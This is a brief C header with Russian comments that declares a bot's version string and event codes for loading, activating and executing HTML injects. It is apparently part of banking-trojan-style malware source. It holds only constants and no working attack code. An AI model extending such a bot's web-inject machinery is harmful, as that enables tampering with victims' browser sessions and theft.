
//*****************************************************************************
//  Модуль глобальных объявлений бота
//
//  Дата:   Апрель 2012
//  Версия: 1.0
//*****************************************************************************

#ifndef BotDefH
#define BotDefH
//-----------------------------------------------------------------------------


//********************************************
// Версия бота
//********************************************
const static char BOT_VERSION[] = "1.0.1";


//********************************************
//  События HTML инжектов
//********************************************
#define BOT_EVENT_HTMLINJECTS_CLEAR    101    /* Очищен список HTML инжектов */
#define BOT_EVENT_HTMLINJECTS_LOADED   102    /* Загружен список HTML инжектов */
#define BOT_EVENT_HTMLINJECT_ACTIVATED 103    /* HTML инжект использован в документах */
#define BOT_EVENT_HTMLINJECT_EXECUTE   104   /* Выполнение HTML инжекта */

//-----------------------------------------------------------------------------
#endif
